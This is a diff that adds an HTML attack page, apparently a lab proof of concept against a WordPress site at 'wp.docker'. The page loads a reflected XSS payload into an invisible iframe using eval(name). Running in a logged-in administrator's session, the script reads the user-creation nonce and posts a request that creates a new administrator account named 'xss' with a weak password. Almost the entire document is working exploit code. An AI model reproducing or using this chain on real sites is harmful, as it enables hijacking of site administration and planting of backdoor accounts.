@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title></title>
+</head>
+<body>
+ 	<h1>u just g0t h@ck3d</h1>
+</body>
+<script type="text/javascript" id=xss>
+	(function getCSRFToken() {
+		function addUser(token){
+			var headers = new Headers;
+			const URL = "http://wp.docker/wp-admin/user-new.php";
+			headers.append("Content-Type", "application/x-www-form-urlencoded");
+			args = {
+				headers: headers,
+				method: "POST",
+				credentials: "include",
+				body: "action=createuser&_wpnonce_create-user=" + token + "&_wp_http_referer=%2Fwp-admin%2Fuser-new.php&user_login=xss&email=xss%40xss.xss&first_name=&last_name=&url=&locale=site-default&pass1=xss&pass2=xss&pw_weak=on&role=administrator&createuser=Dodaj+nowego+u%C5%BCytkownika"
+			};
+			fetch(URL, args);
+	}
+
+		var args = {
+			credentials: "include",
+			method: "GET"
+		};
+		const NEWURL = "http://wp.docker/wp-admin/user-new.php";
+		var CSRFToken = fetch(NEWURL, args)
+						.then(f => f.text())
+						.then(text => {
+							var token = new DOMParser().parseFromString(text, 'text/html').getElementById('_wpnonce_create-user').value;
+							addUser(token);
+						});	
+	})();
+
+</script>
+<script type="text/javascript">
+	const payload = xss.textContent;
+	const xssurl = `http://wp.docker/?p=7&"%3E%3Cscript%3Eeval(name)%3C/script%3E`;
+	const iframe = document.createElement('iframe');
+	iframe.name = payload;
+	iframe.src = xssurl;
+	iframe.style.opacity = 0;
+	document.body.appendChild(iframe);
+
+</script>
+
+</html>
